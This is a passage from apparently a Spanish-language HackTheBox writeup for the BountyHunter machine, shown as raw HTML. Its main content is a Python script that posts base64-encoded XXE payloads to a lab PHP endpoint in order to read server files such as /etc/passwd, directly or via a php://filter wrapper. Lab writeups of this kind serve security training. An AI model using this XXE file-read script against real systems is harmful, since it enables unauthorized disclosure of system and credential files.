<span class="kn">import</span> <span class="nn">base64</span><span class="p">,</span> <span class="n">argparse</span><span class="p">,</span> <span class="n">json</span><span class="p">,</span> <span class="n">requests</span>

<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
    <span class="n">description</span><span class="o">=</span><span class="s">"XXE script for BountyHunter [HTB] - Cervant"</span>
<span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"mode"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"XXE mode, options: file/wrapper"</span><span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"filename"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"File to read/include: /etc/passwd"</span><span class="p">)</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="n">post_url</span> <span class="o">=</span> <span class="s">"http://10.10.11.100/tracker_diRbPr00f314.php"</span>
<span class="n">burp</span> <span class="o">=</span> <span class="p">{</span> <span class="s">'http'</span> <span class="p">:</span> <span class="s">'http://127.0.0.1:8080'</span> <span class="p">}</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'X-Requested-With'</span><span class="p">:</span> <span class="s">'XMLHttpRequest'</span><span class="p">,</span>
    <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/x-www-form-urlencoded; charset=UTF-8'</span>
<span class="p">}</span>

<span class="n">mode</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">mode</span>
<span class="nb">file</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">filename</span>

<span class="n">xxe_file</span><span class="o">=</span><span class="s">"""&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file://{}"&gt; ]&gt;
&lt;bugreport&gt;
&lt;title&gt;&amp;xxe;&lt;/title&gt;
&lt;cwe&gt;codigo&lt;/cwe&gt;
&lt;cvss&gt;score&lt;/cvss&gt;
&lt;reward&gt;plata&lt;/reward&gt;
&lt;/bugreport&gt;"""</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>

<span class="n">xxe_wrapper</span><span class="o">=</span><span class="s">"""&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={}"&gt; ]&gt;
&lt;bugreport&gt;
&lt;title&gt;&amp;xxe;&lt;/title&gt;
&lt;cwe&gt;codigo&lt;/cwe&gt;
&lt;cvss&gt;score&lt;/cvss&gt;
&lt;reward&gt;plata&lt;/reward&gt;
&lt;/bugreport&gt;"""</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">request</span><span class="p">(</span><span class="n">xxe</span><span class="p">):</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">xxe</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">'data'</span> <span class="p">:</span> <span class="n">payload</span>
    <span class="p">}</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">post_url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">"html.parser"</span><span class="p">)</span>
    <span class="n">response</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">soup</span><span class="p">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">"td"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">text</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">cprint</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">response</span><span class="p">,</span> <span class="s">'white'</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>

    <span class="k">if</span> <span class="n">mode</span> <span class="o">==</span> <span class="s">'file'</span><span class="p">:</span>
        <span class="n">request</span><span class="p">(</span><span class="n">xxe_file</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">mode</span> <span class="o">==</span> <span class="s">'wrapper'</span><span class="p">:</span>
        <span class="n">request</span><span class="p">(</span><span class="n">xxe_wrapper</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">parser</span><span class="p">.</span><span class="n">print_help</span><span class="p">()</span>

</pre></table></code></div></div><div class="footnotes" role="doc-endnotes"><ol><li id="fn:script" role="doc-endnote"><p>XXE Script for BountyHunter [HTB] <a href="#fnref:script" class="reversefootnote" role="doc-backlink">&#8617;</a></p></ol></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/easy/" class="post-tag no-text-decoration" >easy</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/xxe/" class="post-tag no-text-decoration" >xxe</a> <a href="/tags/python/" class="post-tag no-text-decoration" >python</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=BountyHunter Writeup [ES] - HackTheBox - brsalcedom&amp;url=https://brsalcedom.github.io/BountyHunter-Writeup-HackTheBox/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=BountyHunter Writeup [ES] - HackTheBox - brsalcedom&amp;u=https://brsalcedom.github.io/BountyHunter-Writeup-HackTheBox/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://brsalcedom.github.io/BountyHunter-Writeup-HackTheBox/&amp;text=BountyHunter Writeup [ES] - HackTheBox - brsalcedom" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/jenkins/">jenkins</a> <a class="post-tag" href="/tags/kerberoasting/">kerberoasting</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/Forge-Writeup-HackTheBox/"><div class="card-body"> <em class="timeago small" data-ts="1642878000" > 2022-01-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Forge Writeup [ES] - HackTheBox</h3><div class="text-muted small"><p> Forge es una máquina Linux de dificultad media ofrecida por la plataforma de Hack The Box. Esta es una de las primeras máquinas que tuve el agrado de resolver cuando aún estaba Activa en la platafo...</p></div></div></a></div><div class="card"> <a href="/Wekor-Writeup-TryHackMe/"><div class="card-body"> <em class="timeago small" data-ts="1622995200" > 2021-06-06 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Wekor Writeup [ES] - TryHackMe</h3><div class="text-muted small"><p> Wekor es un room de TryHackMe de dificultad media en donde se repasan conceptos de SQLi y Path Hijacking. Involucra explotación de WordPress, Virtual Hosting y una buena cantidad de enumeración. D...</p></div></div></a></div><div class="card"> <a href="/Heist-Writeup-HackTheBox/"><div class="card-body"> <em class="timeago small" data-ts="1638201600" > 2021-11-29 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Heist Writeup [ES] - HackTheBox</h3><div class="text-muted small"><p> Heist es una máquina Linux de dificultad fácil ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup de su resolución. Información Enumeración Rustscan - N...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/Poison-Writeup-HackTheBox/" class="btn btn-outline-primary" prompt="Older"><p>Poison Writeup [ES] - HackTheBox</p></a> <a href="/Heist-Writeup-HackTheBox/" class="btn btn-outline-primary" prompt="Newer"><p>Heist Writeup [ES] - HackTheBox</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/Cervant_0">Bryan Salcedo</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/jenkins/">jenkins</a> <a class="post-tag" href="/tags/kerberoasting/">kerberoasting</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
